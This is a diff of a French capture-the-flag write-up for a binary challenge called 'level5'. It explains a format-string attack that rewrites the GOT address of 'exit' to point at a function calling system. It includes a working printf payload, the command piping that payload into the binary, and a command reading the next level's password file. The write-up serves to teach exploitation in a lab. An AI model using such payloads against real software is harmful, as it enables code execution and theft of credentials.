@@ -5,7 +5,7 @@ Nous avons deux fonctions 'o' et 'n'
 La premier est call nul part mais contient un call a system
 
 Dans la seconde on constate qu'il y a un call a 'exit'
-On va essayer decrire le GOT pour modifier l'addresse de 'exit' par celle de la fonction 'o'
+On va essayer de modifier l'addresse GOT de 'exit' par celle de la fonction 'o'
 
 Recuperons l'addresse de exit
 
@@ -32,6 +32,8 @@ Remplacons donc les quatre dernier caracteres par 84a4 (33956 en decimal)
 Pour remplacer les deux derniers bytes avec printf, il nous suffit d'utiliser 'hn' 
 
 python -c "print '\x38\x98\x04\x08' + '%33952d' + '%4\$hn'" > /tmp/level5
+
+cat /tmp/level5 - | ./level5
 
 cd ../level6 && cat .pass
 
